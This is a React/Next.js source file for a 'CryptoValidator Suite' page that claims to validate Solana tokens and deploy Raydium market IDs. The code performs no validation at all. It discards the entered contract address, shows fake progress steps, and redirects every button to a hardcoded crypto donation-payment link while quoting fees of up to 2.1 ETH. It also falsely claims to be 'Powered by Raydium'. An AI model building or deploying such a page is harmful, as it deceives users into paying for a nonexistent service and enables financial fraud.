
"use client";

import { useState, useEffect } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import AppTitle from "@/components/AppTitle";
import InfoBar from "@/components/InfoBar";
import { Loader2, Box, GitCompareArrows, Network, UploadCloud } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";

export default function CryptoValidatorPage() {
  const [isClient, setIsClient] = useState(false);
  const [tokenCA, setTokenCA] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    setIsClient(true);
  }, []);

  const handleSubmitTokenCA = async (validationType?: string) => {
    if (tokenCA.trim() === '') {
      toast({
        title: "Validation Error",
        description: "Please enter a Token Contract Address before proceeding.",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);
    
    try {
      const response = await fetch('https://api-v2.payerurl.com/api/donate-payment-request/eyJpdiI6Inh3ZEN0cGZLRy84S0hEb1Y5b1M0OVE9PSIsInZhbHVlIjoiMXdDdWtjTjJsYXY2VzZWZFNuVmpkd2t5Z0t4bWF5YXRyeS9rdU9Sb3dieFI1MURqOWZVK0IvUDNLa0IzVnFTNkxuZXdaTjFydUs3VDl1WEMwWUhEV1E9PSIsIm1hYyI6ImNmM2Q5MWI3ZmZhNGIwM2FhOThjY2UyZWY0YzM4Yzc1MWJmYTFhMGUxNjcwOGE3M2M1ZjgwZWMwNGZiMGU2MzQiLCJ0YWciOiIifQ==', {
        method: 'GET',
        headers: {
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({ message: `API request failed with status ${response.status}` }));
        throw new Error(errorData.message || `API request failed with status ${response.status}`);
      }
      
      const paymentAPIResponse = await response.json();
      
      if (paymentAPIResponse.status && paymentAPIResponse.redirectTO) {
        toast({
          title: `${validationType || "Process"} Initiated`,
          description: "Redirecting to payment and market ID setup...",
        });
        window.location.href = paymentAPIResponse.redirectTO;
      } else {
        throw new Error(paymentAPIResponse.message || 'Invalid response from payment server.');
      }
    } catch (error: any) {
      console.error('Payment Initiation Error:', error);
      toast({
        title: "Error",
        description: error.message || "There was an error processing your request. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!isClient) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-background p-4">
        <AppTitle />
        <Loader2 className="h-12 w-12 animate-spin text-primary mt-8" />
        <p className="mt-4 text-muted-foreground">Initializing Interface...</p>
      </div>
    );
  }

  const validationSteps = [
    "Verifying Token CA format...",
    "Checking CA on Solana network...",
    "Fetching token metadata...",
    "Preparing smart contract interaction...",
    "Contacting payment gateway...",
  ];

  const ctaSections = [
    {
      title: "Standard Validation",
      icon: <Box className="h-6 w-6 text-primary" />,
      description: "Essential token validation and market ID setup on its native blockchain. Ensures your token is recognized and ready for liquidity.",
      feeNote: "Process Fee: Up to 2.1 ETH for market ID deployment and initial validation.",
      buttonText: "Initiate Standard Validation",
      validationType: "Standard Validation"
    },
    {
      title: "Enhanced Cross-Check",
      icon: <GitCompareArrows className="h-6 w-6 text-primary" />,
      description: "Comprehensive validation with cross-referencing capabilities for tokens aiming for broader interoperability. Includes standard market ID setup.",
      feeNote: "Process Fee: Up to 2.1 ETH for market ID deployment and enhanced validation.",
      buttonText: "Initiate Enhanced Validation",
      validationType: "Enhanced Validation"
    },
    {
      title: "Premier Multi-Chain Presence",
      icon: <Network className="h-6 w-6 text-primary" />,
      description: "Top-tier validation designed for tokens with a multi-chain strategy, ensuring maximum visibility and compatibility. Includes standard market ID setup.",
      feeNote: "Process Fee: Up to 2.1 ETH for market ID deployment and premier validation.",
      buttonText: "Initiate Premier Validation",
      validationType: "Premier Validation"
    }
  ];

  return (
    <main className="min-h-screen flex flex-col items-center p-4 sm:p-6 bg-background font-body">
      <AppTitle />
      <InfoBar />
      <Card className="w-full max-w-xl shadow-xl mt-6">
        <CardHeader>
          <CardTitle className="text-3xl font-headline text-center">CryptoValidator Suite</CardTitle>
          <CardDescription className="text-center text-base">
            Secure your token's market presence on Raydium with our streamlined validation and deployment tools.
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Tabs defaultValue="uploadContract" className="w-full">
            <TabsList className="grid w-full grid-cols-1 sm:grid-cols-2 h-auto bg-card text-card-foreground p-1 rounded-md">
              <TabsTrigger value="uploadContract" className="text-base py-3 data-[state=active]:shadow-md data-[state=active]:bg-primary data-[state=active]:text-primary-foreground sm:text-sm sm:py-1.5">Upload Contract</TabsTrigger>
              <TabsTrigger value="tokenCA" className="text-base py-3 data-[state=active]:shadow-md data-[state=active]:bg-primary data-[state=active]:text-primary-foreground sm:text-sm sm:py-1.5">Validate &amp; Deploy Market ID</TabsTrigger>
            </TabsList>
            
            <TabsContent value="uploadContract" className="mt-6 p-4 border rounded-md bg-card/50">
              <div className="flex flex-col items-center text-center">
                <UploadCloud className="h-12 w-12 text-primary mb-3" />
                <h3 className="text-xl font-semibold mb-2">Upload Your Smart Contract</h3>
                <p className="text-sm text-muted-foreground mb-4 max-w-md">
                  For archival purposes or future advanced analysis, you can upload your compiled smart contract file here. 
                  This step is important for a comprehensive validation. The market ID deployment process is initiated via the 'Validate &amp; Deploy Market ID' tab using your token's Contract Address after this step.
                </p>
                <div className="w-full max-w-md mx-auto">
                  <div className="mb-8"> 
                    <Label htmlFor="contractFile" className="sr-only">Smart Contract File</Label>
                    <Input id="contractFile" type="file" className="w-full text-sm file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-primary file:text-primary-foreground hover:file:bg-primary/90" />
                  </div>
                  <Button type="button" variant="secondary" className="w-full" onClick={() => toast({ title: "Note", description: "File upload is conceptual for this demo."})}>
                    Upload File
                  </Button>
                </div>
              </div>
            </TabsContent>

            <TabsContent value="tokenCA" className="mt-6 p-4 border rounded-md bg-card/50">
              {isSubmitting ? (
                <div className="space-y-4 text-center p-6">
                  <Loader2 className="mx-auto h-10 w-10 animate-spin text-primary" />
                  <p className="text-xl font-semibold text-primary">Processing Your Request...</p>
                  <Card className="bg-background/50 p-4">
                    <ul className="space-y-2 text-sm text-muted-foreground list-disc list-inside pl-4 text-left">
                      {validationSteps.map((step, index) => (
                        <li key={index}>{step}</li>
                      ))}
                    </ul>
                  </Card>
                  <p className="text-xs text-muted-foreground pt-2">Please wait, this may take a few moments. Do not close or refresh this page.</p>
                </div>
              ) : (
                <div className="space-y-6">
                  <Card className="p-6 bg-card/80 shadow-md">
                    <Label htmlFor="tokenCAInput" className="text-lg font-medium block mb-2 text-center">
                      Enter Your Token Contract Address (CA)
                    </Label>
                    <Input
                      id="tokenCAInput"
                      placeholder="Solana Token Contract Address (e.g., SoLju...) "
                      value={tokenCA}
                      onChange={(e) => setTokenCA(e.target.value)}
                      className="mt-1 text-base p-3 text-center"
                      disabled={isSubmitting}
                    />
                    <p className="text-xs text-muted-foreground mt-2 text-center">
                      This is the unique identifier for your token on the Solana blockchain. Ensure you have uploaded your contract in the previous tab if applicable.
                    </p>
                  </Card>

                  <div className="grid grid-cols-1 md:grid-cols-1 gap-6">
                    {ctaSections.map((cta, index) => (
                      <Card key={index} className="bg-card/80 shadow-md hover:shadow-lg transition-shadow duration-300">
                        <CardHeader className="flex flex-row items-center space-x-3 pb-3">
                          {cta.icon}
                          <CardTitle className="text-xl font-headline">{cta.title}</CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-3">
                          <p className="text-sm text-muted-foreground">{cta.description}</p>
                          <p className="text-xs font-semibold text-accent">{cta.feeNote}</p>
                          <Button
                            onClick={() => handleSubmitTokenCA(cta.validationType)}
                            className="w-full bg-primary hover:bg-primary/90 text-primary-foreground mt-2 py-3 text-base"
                            disabled={isSubmitting || !tokenCA}
                          >
                            {cta.buttonText}
                          </Button>
                        </CardContent>
                      </Card>
                    ))}
                  </div>
                   <p className="text-center text-xs text-muted-foreground pt-4">
                    Ensure your connected wallet has sufficient SOL for transaction fees and the required ETH for market ID deployment.
                  </p>
                </div>
              )}
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
      <footer className="mt-12 text-center text-sm text-muted-foreground pb-6">
        <p>&copy; {new Date().getFullYear()} CryptoValidator. All rights reserved.</p>
        <p className="mt-1">Secure token validation and Raydium market ID setup.</p>
        <p className="mt-1 font-semibold">
          Powered by <a href="https://raydium.io/" target="_blank" rel="noopener noreferrer" className="underline hover:text-accent">Raydium</a>
        </p>
      </footer>
    </main>
  );
}

    